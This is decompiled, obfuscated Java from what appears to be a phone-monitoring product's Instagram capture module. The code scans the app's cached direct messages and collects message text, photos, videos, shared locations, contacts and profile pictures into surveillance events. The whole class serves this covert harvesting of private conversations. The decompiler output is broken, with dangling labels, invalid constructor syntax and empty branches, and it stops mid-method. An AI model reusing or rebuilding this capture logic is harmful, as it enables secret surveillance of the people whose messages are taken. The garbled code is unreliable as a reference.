package com.vvt.capture.instagram.directmessage;

import com.vvt.capture.instagram.directmessage.data.CachedMessageContentType;
import com.vvt.capture.instagram.directmessage.data.g;
import com.vvt.capture.instagram.directmessage.data.h;
import com.vvt.capture.instagram.directmessage.data.i;
import com.vvt.capture.instagram.directmessage.data.j;
import com.vvt.capture.instagram.directmessage.data.k;
import com.vvt.capture.instagram.directmessage.data.l;
import com.vvt.capture.instagram.directmessage.data.n;
import com.vvt.capture.instagram.directmessage.data.o;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import java.io.File;
import java.io.FilenameFilter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class b
{
  private static final String a = b.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  
  public static long a()
  {
    return a(com.vvt.capture.instagram.a.a());
  }
  
  public static long a(int paramInt, String paramString)
  {
    long l1 = -1;
    boolean bool1 = b;
    if ((!bool1) || ((paramString != null) && (paramInt > 0))) {}
    for (;;)
    {
      long l2;
      try
      {
        localObject = d.a(paramString);
        if (localObject == null) {
          break label213;
        }
        localObject = ((com.vvt.capture.instagram.directmessage.data.f)localObject).a();
        com.vvt.capture.instagram.directmessage.data.a.a locala = new com/vvt/capture/instagram/directmessage/data/a/a;
        locala.<init>();
        Collections.sort((List)localObject, locala);
        int i = ((List)localObject).size();
        int k = ((List)localObject).size();
        if (paramInt <= k) {
          continue;
        }
        j = b;
        if (j != 0) {}
        j = 0;
        locala = null;
        localObject = ((List)localObject).get(0);
        localObject = (com.vvt.capture.instagram.directmessage.data.e)localObject;
        localObject = ((com.vvt.capture.instagram.directmessage.data.e)localObject).c();
        l2 = Long.parseLong((String)localObject);
        l1 = l2;
      }
      catch (Exception localException)
      {
        Object localObject;
        int j;
        boolean bool2;
        bool1 = c;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = b;
      if (bool1) {}
      return l1;
      if (j > 0)
      {
        bool2 = b;
        if (bool2) {}
        j -= paramInt;
        localObject = ((List)localObject).get(j);
        localObject = (com.vvt.capture.instagram.directmessage.data.e)localObject;
        localObject = ((com.vvt.capture.instagram.directmessage.data.e)localObject).c();
        l2 = Long.parseLong((String)localObject);
      }
      else
      {
        label213:
        l2 = l1;
      }
    }
  }
  
  public static long a(String paramString)
  {
    l1 = -1;
    bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    try
    {
      Object localObject1 = d.a(paramString);
      if (localObject1 == null) {
        break label206;
      }
      localObject1 = ((com.vvt.capture.instagram.directmessage.data.f)localObject1).a();
      if (localObject1 == null) {
        break label188;
      }
      int i = ((List)localObject1).size();
      if (i <= 0) {
        break label188;
      }
      Object localObject2 = new com/vvt/capture/instagram/directmessage/data/a/a;
      ((com.vvt.capture.instagram.directmessage.data.a.a)localObject2).<init>();
      Collections.sort((List)localObject1, (Comparator)localObject2);
      i = ((List)localObject1).size() + -1;
      localObject1 = ((List)localObject1).get(i);
      localObject1 = (com.vvt.capture.instagram.directmessage.data.e)localObject1;
      localObject1 = ((com.vvt.capture.instagram.directmessage.data.e)localObject1).c();
      localObject2 = new java/lang/StringBuilder;
      ((StringBuilder)localObject2).<init>();
      int j = ((String)localObject1).length() + -6;
      localObject1 = ((String)localObject1).substring(0, j);
      localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
      localObject2 = "999999";
      localObject1 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ((StringBuilder)localObject1).toString();
      l2 = Long.parseLong((String)localObject1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2;
        bool1 = c;
        if (bool1) {}
        long l2 = l1;
        continue;
        l2 = l1;
      }
    }
    bool2 = b;
    if (bool2) {}
    l1 = l2;
    label188:
    return l1;
  }
  
  private static InstagramDirectMessageData.Direction a(com.vvt.im.events.info.d paramd, com.vvt.im.events.info.f paramf)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject = paramd.b();
    String str = paramf.a();
    bool1 = ((String)localObject).equals(str);
    if (bool1) {}
    for (localObject = InstagramDirectMessageData.Direction.OUT;; localObject = InstagramDirectMessageData.Direction.IN)
    {
      boolean bool2 = b;
      if (bool2) {}
      return (InstagramDirectMessageData.Direction)localObject;
    }
  }
  
  private static com.vvt.capture.instagram.directmessage.data.e a(ArrayList paramArrayList, String paramString)
  {
    boolean bool1 = true;
    int i = 0;
    boolean bool2 = b;
    label32:
    label54:
    int j;
    com.vvt.capture.instagram.directmessage.data.e locale;
    String str;
    if ((!bool2) || (paramArrayList != null))
    {
      bool2 = bool1;
      int k = paramArrayList.size();
      if (k <= 0) {
        break label114;
      }
      bool2 &= bool1;
      if (!bool2) {
        break label129;
      }
      bool2 = com.vvt.ag.b.a(paramString);
      if (bool2) {
        break label129;
      }
      j = paramArrayList.size();
      if (i >= j) {
        break label129;
      }
      locale = (com.vvt.capture.instagram.directmessage.data.e)paramArrayList.get(i);
      str = locale.a();
      bool1 = str.equals(paramString);
      if (!bool1) {
        break label122;
      }
    }
    for (;;)
    {
      bool1 = b;
      if (bool1) {}
      return locale;
      j = 0;
      locale = null;
      break;
      label114:
      bool1 = false;
      str = null;
      break label32;
      label122:
      i += 1;
      break label54;
      label129:
      j = 0;
      locale = null;
    }
  }
  
  private static com.vvt.im.events.info.a a(com.vvt.capture.instagram.directmessage.data.a parama, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.a locala = new com/vvt/im/events/info/a;
    locala.<init>();
    Object localObject1 = parama.e();
    Object localObject2 = ((h)((i)localObject1).a().a().get(0)).a();
    Object localObject3 = ImMediaFileType.ATTACHMENT;
    localObject3 = a((String)localObject2, paramString, (ImMediaFileType)localObject3);
    bool1 = com.vvt.ag.b.a((String)localObject3);
    if (!bool1)
    {
      bool1 = b;
      if (bool1) {}
      localObject2 = ((i)localObject1).b();
      Object localObject4 = "2";
      bool1 = ((String)localObject2).equals(localObject4);
      if (bool1)
      {
        localObject2 = ((o)((i)localObject1).c().get(0)).a();
        localObject1 = ImMediaFileType.ATTACHMENT;
        localObject2 = a((String)localObject2, paramString, (ImMediaFileType)localObject1);
        localObject1 = com.vvt.io.d.k((String)localObject2);
        localObject4 = new java/lang/StringBuilder;
        ((StringBuilder)localObject4).<init>();
        localObject1 = ((StringBuilder)localObject4).append((String)localObject1);
        localObject4 = ".mp4";
        localObject1 = (String)localObject4;
        locala.a((String)localObject1);
        locala.c((String)localObject2);
        locala.d((String)localObject3);
        localObject2 = new byte[0];
        locala.b((byte[])localObject2);
        locala.b("video/mp4");
        localObject2 = locala;
      }
    }
    for (;;)
    {
      boolean bool2 = b;
      if (bool2) {}
      return (com.vvt.im.events.info.a)localObject2;
      localObject2 = com.vvt.io.d.k((String)localObject3);
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = ((StringBuilder)localObject1).append((String)localObject2);
      localObject1 = ".jpg";
      localObject2 = (String)localObject1;
      locala.a((String)localObject2);
      locala.c((String)localObject3);
      locala.d((String)localObject3);
      localObject2 = new byte[0];
      locala.b((byte[])localObject2);
      locala.b("image/jpeg");
      localObject2 = locala;
      continue;
      bool1 = false;
      localObject2 = null;
    }
  }
  
  private static com.vvt.im.events.info.b a(com.vvt.capture.instagram.directmessage.data.e parame, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    com.vvt.im.events.info.b localb = new com/vvt/im/events/info/b;
    localb.<init>();
    if ((parame != null) && (paramString != null))
    {
      String str1 = parame.a();
      String str2 = parame.b();
      bool1 = com.vvt.ag.b.a(str2);
      Object localObject2;
      if (bool1)
      {
        ArrayList localArrayList = (ArrayList)parame.e();
        int i = 0;
        Object localObject1 = null;
        localObject2 = str2;
        int j = 0;
        str2 = null;
        i = localArrayList.size();
        if (j < i)
        {
          localObject1 = (k)localArrayList.get(j);
          boolean bool2 = com.vvt.ag.b.a((String)localObject2);
          Object localObject3;
          if (!bool2)
          {
            localObject3 = new java/lang/StringBuilder;
            ((StringBuilder)localObject3).<init>();
            localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
            localObject3 = ", ";
            localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
            localObject1 = ((k)localObject1).b();
            localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
          }
          for (localObject2 = ((StringBuilder)localObject1).toString();; localObject2 = ((StringBuilder)localObject1).toString())
          {
            i = j + 1;
            j = i;
            break;
            localObject3 = new java/lang/StringBuilder;
            ((StringBuilder)localObject3).<init>();
            localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
            localObject1 = ((k)localObject1).b();
            localObject1 = ((StringBuilder)localObject2).append((String)localObject1);
          }
        }
      }
      else
      {
        localObject2 = str2;
      }
      localb.a(str1);
      localb.b((String)localObject2);
    }
    bool1 = b;
    if (bool1) {}
    return localb;
  }
  
  private static com.vvt.im.events.info.c a(com.vvt.capture.instagram.directmessage.data.a parama)
  {
    com.vvt.capture.instagram.directmessage.data.d locald = parama.i();
    com.vvt.im.events.info.c localc = null;
    if (locald != null)
    {
      localc = new com/vvt/im/events/info/c;
      localc.<init>();
      String str = locald.a();
      localc.a(str);
      double d1 = locald.b();
      localc.a(d1);
      double d2 = locald.c();
      localc.b(d2);
    }
    return localc;
  }
  
  private static com.vvt.im.events.info.d a(com.vvt.capture.instagram.directmessage.data.e parame, String paramString1, String paramString2)
  {
    String str1 = null;
    int i = 0;
    boolean bool1 = b;
    if (bool1) {}
    Pattern localPattern = Pattern.compile("^\\d+");
    Object localObject1 = new java/io/File;
    ((File)localObject1).<init>(paramString2);
    Object localObject2 = new com/vvt/capture/instagram/directmessage/c;
    ((c)localObject2).<init>(localPattern);
    File[] arrayOfFile = ((File)localObject1).listFiles((FilenameFilter)localObject2);
    bool1 = b;
    if (bool1) {}
    long l1 = -1;
    int k = 0;
    Object localObject3 = null;
    int j = arrayOfFile.length;
    long l2;
    if (k < j)
    {
      localObject1 = arrayOfFile[k];
      l2 = ((File)localObject1).lastModified();
      boolean bool3 = l2 < l1;
      if (!bool3) {
        break label324;
      }
    }
    for (Object localObject4 = arrayOfFile[k];; localObject4 = localObject3)
    {
      int m = k + 1;
      k = m;
      localObject3 = localObject4;
      l1 = l2;
      break;
      localObject1 = ((File)localObject3).getName();
      localObject1 = localPattern.matcher((CharSequence)localObject1);
      boolean bool5 = ((Matcher)localObject1).find();
      if (bool5) {
        str1 = ((Matcher)localObject1).group(0);
      }
      boolean bool2 = b;
      if (bool2) {}
      localObject4 = new com/vvt/im/events/info/d;
      ((com.vvt.im.events.info.d)localObject4).<init>();
      ((com.vvt.im.events.info.d)localObject4).b(str1);
      localObject1 = (ArrayList)parame.d();
      for (;;)
      {
        int n = ((ArrayList)localObject1).size();
        if (i < n)
        {
          localObject2 = ((com.vvt.capture.instagram.directmessage.data.a)((ArrayList)localObject1).get(i)).b();
          String str2 = ((n)localObject2).c();
          boolean bool4 = str2.equals(str1);
          if (bool4)
          {
            localObject1 = ((n)localObject2).a();
            ((com.vvt.im.events.info.d)localObject4).a((String)localObject1);
            localObject1 = ((n)localObject2).b();
            localObject2 = ImMediaFileType.OWNER_PROFILE;
            localObject1 = a((String)localObject1, paramString1, (ImMediaFileType)localObject2);
            ((com.vvt.im.events.info.d)localObject4).f((String)localObject1);
          }
        }
        else
        {
          bool2 = b;
          if (bool2) {}
          return (com.vvt.im.events.info.d)localObject4;
        }
        i += 1;
      }
      label324:
      l2 = l1;
    }
  }
  
  private static String a(String paramString1, String paramString2, ImMediaFileType paramImMediaFileType)
  {
    Object localObject = null;
    byte[] arrayOfByte = new byte[0];
    boolean bool = com.vvt.ag.b.a(paramString1);
    if (!bool)
    {
      arrayOfByte = b(paramString1);
      if (arrayOfByte != null)
      {
        int i = arrayOfByte.length;
        if (i > 0)
        {
          localObject = ImType.INSTAGRAM;
          localObject = com.vvt.im.a.c.a(paramString2, (ImType)localObject, paramImMediaFileType);
          String str = com.vvt.im.a.c.a(paramImMediaFileType);
          localObject = com.vvt.io.d.a(arrayOfByte, (String)localObject, str);
        }
      }
    }
    bool = b;
    if (bool) {}
    return (String)localObject;
  }
  
  public static ArrayList a(String paramString, long paramLong1, long paramLong2)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = d.a(paramString);
      if (localObject1 != null)
      {
        localObject1 = ((com.vvt.capture.instagram.directmessage.data.f)localObject1).a();
        localObject1 = (ArrayList)localObject1;
        int i = 0;
        int j = ((ArrayList)localObject1).size();
        if (i < j)
        {
          Object localObject2 = ((ArrayList)localObject1).get(i);
          localObject2 = (com.vvt.capture.instagram.directmessage.data.e)localObject2;
          String str = ((com.vvt.capture.instagram.directmessage.data.e)localObject2).c();
          long l = Long.parseLong(str);
          boolean bool2 = l < paramLong1;
          if (!bool2)
          {
            bool2 = l < paramLong2;
            if (!bool2) {
              bool2 = true;
            }
          }
          for (;;)
          {
            if (bool2) {
              localArrayList.add(localObject2);
            }
            j = i + 1;
            i = j;
            break;
            bool2 = false;
            str = null;
          }
        }
      }
      return localArrayList;
    }
    catch (Exception localException)
    {
      bool1 = c;
      if (!bool1) {}
    }
  }
  
  public static ArrayList a(String paramString1, String paramString2, long paramLong1, long paramLong2, com.vvt.base.b paramb, String paramString3)
  {
    boolean bool1 = true;
    boolean bool2 = b;
    if (bool2) {}
    Object localObject1 = new java/util/ArrayList;
    ((ArrayList)localObject1).<init>();
    ArrayList localArrayList = a(paramString2, paramLong1, paramLong2);
    boolean bool3;
    HashMap localHashMap;
    if (localArrayList != null)
    {
      int i = localArrayList.size();
      if (i > 0)
      {
        bool3 = b;
        if (bool3) {}
        localHashMap = a(localArrayList, paramLong1, paramLong2);
        bool3 = b;
        if ((bool3) && (localHashMap == null)) {
          break label143;
        }
        bool3 = bool1;
        int j = localHashMap.size();
        if (j <= 0) {
          break label152;
        }
        label100:
        bool3 &= bool1;
        if (!bool3) {
          break label158;
        }
      }
    }
    label143:
    label152:
    label158:
    for (Object localObject2 = a(localArrayList, localHashMap, paramString1, paramb, paramString3);; localObject2 = localObject1)
    {
      localObject1 = localObject2;
      bool3 = b;
      if (bool3) {}
      return (ArrayList)localObject1;
      bool3 = false;
      localObject2 = null;
      break;
      bool1 = false;
      break label100;
    }
  }
  
  private static ArrayList a(ArrayList paramArrayList, HashMap paramHashMap, String paramString1, com.vvt.base.b paramb, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    bool1 = b;
    if (bool1) {}
    Object localObject1 = paramHashMap.entrySet();
    Iterator localIterator = ((Set)localObject1).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (Map.Entry)localIterator.next();
      String str1 = ((String)((Map.Entry)localObject1).getKey()).toString();
      localObject1 = (ArrayList)((Map.Entry)localObject1).getValue();
      int i = 0;
      Object localObject2 = null;
      int n = 0;
      i = ((ArrayList)localObject1).size();
      if (n < i)
      {
        localObject2 = (com.vvt.capture.instagram.directmessage.data.a)((ArrayList)localObject1).get(n);
        InstagramDirectMessageData localInstagramDirectMessageData = new com/vvt/capture/instagram/directmessage/InstagramDirectMessageData;
        localInstagramDirectMessageData.<init>();
        ArrayList localArrayList2 = new java/util/ArrayList;
        localArrayList2.<init>();
        int i1 = 0;
        Object localObject3 = null;
        Object localObject4 = MessageType.Text;
        int i2 = ((MessageType)localObject4).getNumber();
        Object localObject5;
        Object localObject6;
        String str2;
        boolean bool8;
        boolean bool9;
        boolean bool10;
        boolean bool11;
        boolean bool12;
        boolean bool13;
        boolean bool14;
        boolean bool15;
        long l;
        String str11;
        com.vvt.im.events.info.f localf;
        com.vvt.im.events.info.d locald;
        InstagramDirectMessageData.Direction localDirection;
        ArrayList localArrayList3;
        if (localObject2 != null)
        {
          boolean bool6 = b;
          if (bool6) {}
          localObject5 = a(paramArrayList, str1);
          localObject6 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).a();
          str2 = CachedMessageContentType.TEXT.getTypeName();
          boolean bool7 = ((String)localObject6).equals(str2);
          String str3 = CachedMessageContentType.MEDIA.getTypeName();
          bool8 = ((String)localObject6).equals(str3);
          String str4 = CachedMessageContentType.PROFILE.getTypeName();
          bool9 = ((String)localObject6).equals(str4);
          String str5 = CachedMessageContentType.LIKE.getTypeName();
          bool10 = ((String)localObject6).equals(str5);
          String str6 = CachedMessageContentType.MEDIA_SHARE.getTypeName();
          bool11 = ((String)localObject6).equals(str6);
          String str7 = CachedMessageContentType.ACTION_LOG.getTypeName();
          bool12 = ((String)localObject6).equals(str7);
          String str8 = CachedMessageContentType.LOCATION.getTypeName();
          bool13 = ((String)localObject6).equals(str8);
          String str9 = CachedMessageContentType.HASHTAG.getTypeName();
          bool14 = ((String)localObject6).equals(str9);
          String str10 = CachedMessageContentType.REEL_SHARE.getTypeName();
          bool15 = ((String)localObject6).equals(str10);
          str10 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).c();
          l = d(str10);
          str11 = c(((com.vvt.capture.instagram.directmessage.data.a)localObject2).c());
          localf = f((com.vvt.capture.instagram.directmessage.data.a)localObject2, paramString1);
          locald = a((com.vvt.capture.instagram.directmessage.data.e)localObject5, paramString1, paramString2);
          localDirection = a(locald, localf);
          localArrayList3 = b((com.vvt.capture.instagram.directmessage.data.e)localObject5, paramString1);
          localObject5 = a((com.vvt.capture.instagram.directmessage.data.e)localObject5, paramString1);
          boolean bool16 = b;
          if ((bool16) && (!bool7)) {
            break label561;
          }
          localObject3 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).d();
          i = i2;
          i2 = 0;
          localObject4 = null;
        }
        label561:
        label901:
        int m;
        for (;;)
        {
          localInstagramDirectMessageData.a(i);
          localInstagramDirectMessageData.a(l);
          localInstagramDirectMessageData.b(str11);
          localInstagramDirectMessageData.a(locald);
          localInstagramDirectMessageData.a(localDirection);
          localInstagramDirectMessageData.a(localArrayList3);
          localInstagramDirectMessageData.a((com.vvt.im.events.info.c)localObject4);
          localInstagramDirectMessageData.a(localf);
          localInstagramDirectMessageData.a((com.vvt.im.events.info.b)localObject5);
          localInstagramDirectMessageData.b(localArrayList2);
          localInstagramDirectMessageData.a((String)localObject3);
          localArrayList1.add(localInstagramDirectMessageData);
          boolean bool2 = b;
          if (bool2) {}
          int j = n + 1;
          n = j;
          break;
          boolean bool3;
          if (bool8)
          {
            localObject4 = a((com.vvt.capture.instagram.directmessage.data.a)localObject2, paramString1);
            if (localObject4 != null)
            {
              localArrayList2.add(localObject4);
              localObject2 = MessageType.none;
              j = ((MessageType)localObject2).getNumber();
              i2 = 0;
              localObject4 = null;
            }
            else
            {
              localObject3 = MessageType.Text;
              i1 = ((MessageType)localObject3).getNumber();
              localObject2 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).e().b();
              localObject4 = "2";
              bool3 = ((String)localObject2).equals(localObject4);
              if (bool3)
              {
                localObject2 = InstagramDirectMessageData.Direction.IN;
                if (localDirection == localObject2) {}
                for (localObject2 = "[You sent a video]";; localObject2 = "[You receive a video]")
                {
                  localObject3 = localObject2;
                  bool3 = i1;
                  break;
                }
              }
              localObject2 = InstagramDirectMessageData.Direction.IN;
              if (localDirection == localObject2) {}
              for (localObject2 = "[You sent an image]";; localObject2 = "[You receive an image]")
              {
                localObject3 = localObject2;
                bool3 = i1;
                break;
              }
            }
          }
          else if (bool9)
          {
            localObject3 = new java/lang/StringBuilder;
            ((StringBuilder)localObject3).<init>();
            localObject6 = "https://www.instagram.com/";
            localObject3 = ((StringBuilder)localObject3).append((String)localObject6);
            localObject2 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).f().a();
            localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
            localObject3 = ((StringBuilder)localObject2).toString();
            bool3 = i2;
            i2 = 0;
            localObject4 = null;
          }
          else if (bool10)
          {
            localObject3 = "[LIKE]";
            bool3 = i2;
            i2 = 0;
            localObject4 = null;
          }
          else
          {
            boolean bool4;
            if (bool11)
            {
              localObject4 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).g();
              localObject6 = ((i)localObject4).b();
              str2 = "2";
              bool15 = ((String)localObject6).equals(str2);
              if (bool15) {}
              for (localObject2 = b((com.vvt.capture.instagram.directmessage.data.a)localObject2, paramString1);; localObject2 = c((com.vvt.capture.instagram.directmessage.data.a)localObject2, paramString1))
              {
                if (localObject2 == null) {
                  break label901;
                }
                localArrayList2.add(localObject2);
                localObject2 = MessageType.none;
                int k = ((MessageType)localObject2).getNumber();
                i2 = 0;
                localObject4 = null;
                break;
              }
              i1 = MessageType.Text.getNumber();
              localObject2 = ((i)localObject4).b();
              localObject4 = "2";
              bool4 = ((String)localObject2).equals(localObject4);
              if (bool4)
              {
                localObject2 = InstagramDirectMessageData.Direction.IN;
                if (localDirection == localObject2) {}
                for (localObject2 = "[You sent a video]";; localObject2 = "[You receive a video]")
                {
                  localObject3 = localObject2;
                  bool4 = i1;
                  break;
                }
              }
              localObject2 = InstagramDirectMessageData.Direction.IN;
              if (localDirection == localObject2) {}
              for (localObject2 = "[You sent an image]";; localObject2 = "[You receive an image]")
              {
                localObject3 = localObject2;
                bool4 = i1;
                break;
              }
            }
            if (bool12)
            {
              localObject3 = new java/lang/StringBuilder;
              ((StringBuilder)localObject3).<init>();
              localObject6 = "[";
              localObject3 = ((StringBuilder)localObject3).append((String)localObject6);
              localObject2 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).h().a();
              localObject2 = ((StringBuilder)localObject3).append((String)localObject2).append("]");
              localObject3 = ((StringBuilder)localObject2).toString();
              bool4 = i2;
              i2 = 0;
              localObject4 = null;
            }
            else if (bool13)
            {
              localObject4 = a((com.vvt.capture.instagram.directmessage.data.a)localObject2);
              localObject2 = MessageType.ShareLocation;
              m = ((MessageType)localObject2).getNumber();
            }
            else
            {
              if (!bool14) {
                break label1184;
              }
              localObject2 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).j();
              if (localObject2 != null)
              {
                localObject3 = new java/lang/StringBuilder;
                ((StringBuilder)localObject3).<init>();
                localObject6 = "https://www.instagram.com/explore/tags/";
                localObject3 = ((StringBuilder)localObject3).append((String)localObject6);
                localObject2 = ((com.vvt.capture.instagram.directmessage.data.c)localObject2).a();
                localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
                localObject3 = ((StringBuilder)localObject2).toString();
              }
              m = i2;
              i2 = 0;
              localObject4 = null;
            }
          }
        }
        label1184:
        if (bool15)
        {
          localObject3 = MessageType.Text;
          i1 = ((MessageType)localObject3).getNumber();
          localObject6 = ((com.vvt.capture.instagram.directmessage.data.a)localObject2).k();
          localObject4 = ((l)localObject6).a();
          localObject6 = ((l)localObject6).b().b();
          str2 = "2";
          bool15 = ((String)localObject6).equals(str2);
          if (bool15)
          {
            localObject2 = d((com.vvt.capture.instagram.directmessage.data.a)localObject2, paramString1);
            label1251:
            if (localObject2 == null) {
              break label1292;
            }
            localArrayList2.add(localObject2);
          }
          for (;;)
          {
            m = i1;
            localObject3 = localObject4;
            i2 = 0;
            localObject4 = null;
            break;
            localObject2 = e((com.vvt.capture.instagram.directmessage.data.a)localObject2, paramString1);
            break label1251;
            label1292:
            boolean bool5 = c;
            if (!bool5) {}
          }
        }
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = b;
    if (bool1) {}
    return localArrayList1;
  }
  
  private static HashMap a(ArrayList paramArrayList, long paramLong1, long paramLong2)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    int i;
    for (int j = 0;; j = i)
    {
      i = paramArrayList.size();
      if (j >= i) {
        break;
      }
      Object localObject = (com.vvt.capture.instagram.directmessage.data.e)paramArrayList.get(j);
      ArrayList localArrayList1 = new java/util/ArrayList;
      localArrayList1.<init>();
      ArrayList localArrayList2 = (ArrayList)((com.vvt.capture.instagram.directmessage.data.e)localObject).d();
      int k = 0;
      int m = localArrayList2.size();
      if (k < m)
      {
        com.vvt.capture.instagram.directmessage.data.a locala = (com.vvt.capture.instagram.directmessage.data.a)localArrayList2.get(k);
        String str = locala.c();
        long l = Long.parseLong(str);
        boolean bool2 = l < paramLong1;
        if (bool2)
        {
          bool2 = l < paramLong2;
          if (!bool2) {
            bool2 = true;
          }
        }
        for (;;)
        {
          boolean bool3 = b;
          if ((!bool3) || (bool2)) {
            localArrayList1.add(locala);
          }
          m = k + 1;
          k = m;
          break;
          bool2 = false;
          str = null;
        }
      }
      localObject = ((com.vvt.capture.instagram.directmessage.data.e)localObject).a();
      boolean bool4 = b;
      if (bool4) {}
      localHashMap.put(localObject, localArrayList1);
      i = j + 1;
    }
    return localHashMap;
  }
  
  public static List a(InstagramDirectMessageData paramInstagramDirectMessageData)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = new com/vvt/events/FxIMAccountEvent;
    ((FxIMAccountEvent)localObject1).<init>();
    long l1 = paramInstagramDirectMessageData.b();
    ((FxIMAccountEvent)localObject1).setEventTime(l1);
    int i = FxIMMessageServiceType.INSTAGRAM.getValue();
    ((FxIMAccountEvent)localObject1).setImServiceId(i);
    Object localObject2 = paramInstagramDirectMessageData.f().a();
    ((FxIMAccountEvent)localObject1).setOwnerDisplayName((String)localObject2);
    localObject2 = paramInstagramDirectMessageData.f().b();
    ((FxIMAccountEvent)localObject1).setOwnerId((String)localObject2);
    localObject2 = paramInstagramDirectMessageData.f().c();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicture((byte[])localObject2);
    localObject2 = paramInstagramDirectMessageData.f().g();
    ((FxIMAccountEvent)localObject1).setOwnerProfilePicturePath((String)localObject2);
    localObject2 = paramInstagramDirectMessageData.f().d();
    ((FxIMAccountEvent)localObject1).setOwnerStatusMessage((String)localObject2);
    localArrayList.add(localObject1);
    localObject2 = new com/vvt/events/FxIMConversationEvent;
    ((FxIMConversationEvent)localObject2).<init>();
    localObject1 = paramInstagramDirectMessageData.i().a();
    ((FxIMConversationEvent)localObject2).setConversationId((String)localObject1);
    localObject1 = paramInstagramDirectMessageData.i().c();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicture((byte[])localObject1);
    localObject1 = paramInstagramDirectMessageData.i().d();
    ((FxIMConversationEvent)localObject2).setConversationProfilePicturePath((String)localObject1);
    localObject1 = paramInstagramDirectMessageData.i().b();
    ((FxIMConversationEvent)localObject2).setConversationTitle((String)localObject1);
    localObject1 = paramInstagramDirectMessageData.i().e();
    ((FxIMConversationEvent)localObject2).setConversationStatusMessage((String)localObject1);
    l1 = paramInstagramDirectMessageData.b();
    ((FxIMConversationEvent)localObject2).setEventTime(l1);
    int j = FxIMMessageServiceType.INSTAGRAM.getValue();
    ((FxIMConversationEvent)localObject2).setImServiceId(j);
    localObject1 = paramInstagramDirectMessageData.f().b();
    ((FxIMConversationEvent)localObject2).setOwnerId((String)localObject1);
    Object localObject3 = new java/util/HashSet;
    ((HashSet)localObject3).<init>();
    localObject1 = paramInstagramDirectMessageData.e();
    Object localObject4 = ((List)localObject1).iterator();
    boolean bool1;
    Object localObject6;
    for (;;)
    {
      bool1 = ((Iterator)localObject4).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject4).next();
      localObject5 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject6 = paramInstagramDirectMessageData.f().b();
      boolean bool4 = ((String)localObject5).equalsIgnoreCase((String)localObject6);
      if (bool4)
      {
        bool1 = b;
        if (!bool1) {}
      }
      else
      {
        localObject1 = ((com.vvt.im.events.info.e)localObject1).d();
        ((HashSet)localObject3).add(localObject1);
      }
    }
    ((FxIMConversationEvent)localObject2).setParticipantContactIds((HashSet)localObject3);
    localArrayList.add(localObject2);
    localObject1 = paramInstagramDirectMessageData.e();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = ((Iterator)localObject2).hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.e)((Iterator)localObject2).next();
      localObject3 = ((com.vvt.im.events.info.e)localObject1).d();
      localObject4 = paramInstagramDirectMessageData.f().b();
      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (bool5)
      {
        bool1 = b;
        if (!bool1) {}
      }
      else
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
